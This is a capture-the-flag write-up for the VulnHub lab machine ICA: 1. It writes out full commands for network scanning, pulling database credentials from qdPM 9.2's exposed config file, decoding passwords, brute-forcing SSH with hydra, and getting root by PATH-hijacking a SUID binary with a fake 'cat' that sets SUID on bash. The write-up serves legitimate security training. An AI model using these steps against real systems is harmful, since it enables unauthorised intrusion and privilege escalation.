---
layout: single
title: 'ICA'
excerpt: 'Back to the Top According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is. Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent!'
date: 2026-06-20
classes: wide
header:
  teaser: /assets/images/vulnhublogo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.svg
categories:
  - VulnHub
tags:
  - web
  - credential-exposure
  - mysql
  - base64
  - ssh-bruteforce
  - suid
  - path-hijacking
  - qdp
  - hydra
os: linux
difficulty: Easy
release: 2021-09-25
ip: 192.168.20.75
---

{% include info-card.html %}
### Machine Link
[ICA: 1 ~ VulnHub](https://www.vulnhub.com/entry/ica-1,748/#networking)

### Tools Used

- [arp-scan](https://github.com/royhills/arp-scan)
- [nmap](https://nmap.org/)
- [macchanger](https://www.kali.org/tools/macchanger/)
- [whatweb](https://github.com/urbanadventurer/WhatWeb)
- [searchsploit](https://www.exploit-db.com/searchsploit)
- [mysql](https://dev.mysql.com/downloads/)
- [ssh](https://www.openssh.org/)

## Reconnaissance

<pre class="language-"><code class="language-">
❯ arp-scan -I enp8s0 --localnet
Interface: enp8s0, type: EN10MB, MAC: 88:d7:f6:c8:26:c4, IPv4: 192.168.20.20
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.20.1	14:82:5b:00:00:20	Hefei Radio Communication Technology Co., Ltd
192.168.20.38	14:82:5b:78:99:63	Hefei Radio Communication Technology Co., Ltd
192.168.20.37	f2:6b:9d:22:f7:ea	(Unknown: locally administered)
<span style="color: #bb66ff;">192.168.20.75	00:0c:29:bc:f4:ef	VMware, Inc.</span>
192.168.20.69	28:6b:b4:d7:c4:f6	(Unknown)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.895 seconds (135.09 hosts/sec). 5 responded

</code></pre>

I can identify the target IP because the MAC `00:0c:29`.

<pre class="language-"><code class="language-">
❯ macchanger -l | grep -i vmware
1386 - 00:05:69 - VMware, Inc.
<span style="color: #bb66ff;">3086 - 00:0c:29 - VMware, Inc.</span>
7161 - 00:1c:14 - VMware, Inc
10601 - 00:50:56 - VMware, Inc.

</code></pre>

In this case the IP is `192.168.20.75` so, i can do a ping to know if the machine is up. The TTL of 64 suggests it's a Linux system.

<pre class="language-"><code class="language-">
❯ ping -c 1 192.168.20.75
PING 192.168.20.75 (192.168.20.75) 56(84) bytes of data.
64 bytes from 192.168.20.75: icmp_seq=1 ttl=64 time=0.109 ms

--- 192.168.20.75 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.109/0.109/0.109/0.000 ms

</code></pre>

## Portscan

<pre class="language-"><code class="language-">
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.20.75 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-20 21:57 -05
Initiating ARP Ping Scan at 21:57
Scanning 192.168.20.75 [1 port]
Completed ARP Ping Scan at 21:57, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:57
Scanning 192.168.20.75 [65535 ports]
Discovered open port 80/tcp on 192.168.20.75
Discovered open port 22/tcp on 192.168.20.75
Discovered open port 3306/tcp on 192.168.20.75
Discovered open port 33060/tcp on 192.168.20.75
Completed SYN Stealth Scan at 21:57, 0.89s elapsed (65535 total ports)
Nmap scan report for 192.168.20.75
Host is up, received arp-response (0.00052s latency).
Scanned at 2026-06-20 21:57:50 -05 for 1s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE REASON
<span style="color: #bb66ff;">22/tcp    open  ssh</span>     syn-ack ttl 64
<span style="color: #bb66ff;">80/tcp    open  http</span>    syn-ack ttl 64
<span style="color: #bb66ff;">3306/tcp  open  mysql</span>   syn-ack ttl 64
<span style="color: #bb66ff;">33060/tcp open  mysqlx</span>  syn-ack ttl 64
MAC Address: 00:0C:29:BC:F4:EF (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

</code></pre>

I see that these ports:`22,80,3306,33060` are open so i proceed with a deeper scan to enumerate the services.

 <pre class="language-"><code class="language-">
 ❯ nmap -sCV -p22,80,3306,33060 192.168.20.75 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-20 22:47 -05
Nmap scan report for 192.168.20.75
Host is up (0.00025s latency).

PORT      STATE SERVICE VERSION
<span style="color: #bb66ff;">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
<span style="color: #bb66ff;">80/tcp    open  http    Apache httpd 2.4.48 ((Debian))</span>
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 (Debian)
<span style="color: #bb66ff;">3306/tcp  open  mysql   MySQL 8.0.26</span>
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 41
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsTransactions, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, InteractiveClient, LongPassword, IgnoreSigpipes, ODBCClient, FoundRows, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: h\x03>\x112\x14.ot]Bm
| &dxc7
| 5
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
|_ssl-date: TLS randomness does not represent time
<span style="color: #bb66ff;">33060/tcp open  mysqlx?</span>
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/20%Time=6A375EDE%P=x86_64-pc-linux-gnu%

MAC Address: 00:0C:29:BC:F4:EF (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds

</code></pre>

## Initial Access

I do a simple research with whatweb to see what technologies the page uses. i see `qdPM` and i don't know what that is so i look it up.

<pre class="language-"><code class="language-">
❯ whatweb 192.168.20.75
http://192.168.20.75 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.20.75], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]

</code></pre>

![whatweb scan output](/assets/images/vulnhub-writeup-ica/qdPM web searching.png)

Then i go to the page [http://192.168.20.75/](http://192.168.20.75/) and found that it is a panel login.

![qdPM login panel](/assets/images/vulnhub-writeup-ica/qdPM web.png)

I can see the version is qdPM 9.2 so i search for an exploit with searchsploit

<pre class="language-"><code class="language-">
❯ searchsploit qdPM 9.2
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
<span style="color: #bb66ff;">qdPM 9.2 - Cross-site Request Forgery (CSRF)</span>                                                                                                                                                                            | php/webapps/50854.txt
<span style="color: #bb66ff;">qdPM 9.2 - Password Exposure (Unauthenticated)</span>                                                                                                                                                                          | php/webapps/50176.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
</code></pre>

<pre class="language-"><code class="language-">
❯ searchsploit -x php/webapps/50176.txt
Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

<span style="color: #bb66ff;">The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://website/core/config/databases.yml file and download.</span  >
/opt/exploit-database/exploits/php/webapps/50176.txt (END)
</code></pre>

I check the <span style="color: #33aaff;">php/webapps/50176.txt</span> exploit and see that accessing the route `/core/config/databases.yml` on the web link i can get the password and connection string stored in a yml file

![searchsploit exploit output](/assets/images/vulnhub-writeup-ica/xploit usage.png)

So the credentials are exposed: `username: qdpmadmin`, `password: UcVQCMQk2STVeS6J`. I try them against MySQL.

<pre class="language-"><code class="language-">
❯ mysql -u qdpmadmin -h 192.168.20.75 -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 83
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
</code></pre>

![MySQL databases](/assets/images/vulnhub-writeup-ica/show db.png) ![qdPM tables](/assets/images/vulnhub-writeup-ica/show tables.png)
![Users table](/assets/images/vulnhub-writeup-ica/users db.png) ![Password hashes](/assets/images/vulnhub-writeup-ica/passwords db.png)

I don't know what that hash is. Searching, i find it's Base64 encoded so i decode it.

<pre class="language-"><code class="language-">
❯ while read line; do
  echo "$line" | base64 -d
  echo
done < passwords
suRJAdGwLp8dy3rF
7ZwV4qtg42cmUXGX
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy
</code></pre>

Now with the users and passwords files i brute-force SSH with hydra.

<pre class="language-"><code class="language-">
❯ hydra -L users -P  passwords ssh://192.168.20.75
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-21 05:01:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.20.75:22/
<span style="color: #bb66ff;">[22][ssh] host: 192.168.20.75   login: travis   password: DJceVy98W28Y7wLg</span>
<span style="color: #bb66ff;">[22][ssh] host: 192.168.20.75   login: dexter   password: 7ZwV4qtg42cmUXGX</span>
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-21 05:01:30
</code></pre>

So we're on the machine to look for the user flag.

<pre class="language-"><code class="language-">
❯ ssh travis@192.168.20.75
travis@192.168.20.75's password: 
Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 21 17:24:25 2026 from 192.168.20.20
travis@debian:~$ export TERM=xterm
<span style="color: #bb66ff;">travis@debian:~$ hostname -I
192.168.20.75 2800:484:9090:fa00:20c:29ff:febc:f4ef</span>
travis@debian:~$ 
</code></pre>

the user flag is in travis's home directory `ICA{Secret_Project}`.

<pre class="language-"><code class="language-">
travis@debian:~$ ls
user.txt
travis@debian:~$ cat user.txt 
ICA{Secret_Project}
travis@debian:~$ 
</code></pre>

Then i migrate to `dexter` user to see what is on the home folders and i found a `note.txt`, it contains a hint about a system weakness.

<pre class="language-"><code class="language-">
dexter@debian:/home/dexter$ ls
note.txt
dexter@debian:/home/dexter$ cat note.txt 
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
dexter@debian:/home/dexter$ 
</code></pre>

So i look for SUID binaries to see if something stands out. I see this binary that is uncommon `./opt/get_access`

<pre class="language-"><code class="language-">
dexter@debian:/$ find \-perm -4000 -user root 2>/dev/null
<span style="color: #bb66ff;">./opt/get_access</span>
./usr/bin/chfn
./usr/bin/umount
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/passwd
./usr/bin/newgrp
./usr/bin/su
./usr/bin/mount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
dexter@debian:/$ 
</code></pre>

#### Binary run

<pre class="language-"><code class="language-">
dexter@debian:/$ ./opt/get_access

  ############################
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################

  Server Information:
   - Firewall:	AIwall v9.5.2
   - OS:	Debian 11 "bullseye"
   - Network:	Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.

dexter@debian:/$ 
</code></pre>

I can't read the binary with `cat`, but `strings` reveals it calls `cat /root/system.info`. I can hijack this by creating my own `cat` script.

![strings output from get_access binary](/assets/images/vulnhub-writeup-ica/cat binary.png)

<pre class="language-"><code class="language-">
dexter@debian:/$ strings /opt/get_access
/lib64/ld-linux-x86-64.so.2
setuid
socket
puts
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
<span style="color: #bb66ff;">cat /root/system.info</span>
Could not create socket to access to the system.
All services are disabled. Accessing to the system is allowed only within working hours.
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_access.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
dexter@debian:/$ strings /opt/get_access
/lib64/ld-linux-x86-64.so.2
setuid
dexter@debian:/$ 
</code></pre>

## Privilege Escalation

I'm going to create my own cat and add it at the beginning of the PATH to hijack it

<pre class="language-"><code class="language-">
dexter@debian:/tmp$ touch cat
dexter@debian:/tmp$ chmod +x cat 
dexter@debian:/tmp$ ls -l
total 12
<span style="color: #bb66ff;">-rwxr-xr-x 1 dexter dexter    0 Jun 21 20:08 cat</span>
drwx------ 3 root   root   4096 Jun 21 17:21 systemd-private-a04a2a99afa547008710775db84f59c1-apache2.service-IIN7rg
drwx------ 3 root   root   4096 Jun 21 17:21 systemd-private-a04a2a99afa547008710775db84f59c1-systemd-logind.service-zLYrng
drwx------ 3 root   root   4096 Jun 21 17:21 systemd-private-a04a2a99afa547008710775db84f59c1-systemd-timesyncd.service-y9pEPg
dexter@debian:/tmp$ 
</code></pre>

I can make the bash with permissions SUID and get the privilege escalation.

<pre class="language-"><code class="language-">
  GNU nano 5.4                                                                                                   cat *                                                                                                                       
chmod u+s /bin/bash
</code></pre>

So i modify the PATH so my cat runs first.

<pre class="language-"><code class="language-">
dexter@debian:/tmp$ export PATH=/tmp:$PATH
dexter@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
dexter@debian:/tmp$ 
</code></pre>

I can see my script works — bash now has SUID. I spawn a privileged shell, restore the PATH, and read the root flag.
`ICA{Next_Generation_Self_Renewable_Genetics}`

<pre class="language-"><code class="language-">
dexter@debian:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
dexter@debian:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# 
bash-5.1# echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
bash-5.1# export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
bash-5.1# cd /root/
bash-5.1# ls
root.txt  system.info
bash-5.1# cat root.txt 
ICA{Next_Generation_Self_Renewable_Genetics}
bash-5.1# 
</code></pre>
